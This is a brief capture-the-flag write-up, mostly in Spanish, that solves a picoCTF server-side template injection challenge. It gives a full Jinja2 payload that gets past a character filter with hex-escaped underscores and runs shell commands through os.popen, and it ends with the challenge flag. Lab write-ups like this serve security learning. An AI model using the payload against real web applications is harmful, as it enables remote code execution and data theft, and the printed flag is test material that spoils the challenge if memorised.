#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.

Detalles: para resolver este reto vamos a ir a la siguiente pagina de payloads https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ 
 y vamos a copear el siguiente : {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}} 


modificamos 'id' por 'cat flag' y queda de la siguiente manera 

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}} 

lo introducimos y asi obtenemos la bandera 

# picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}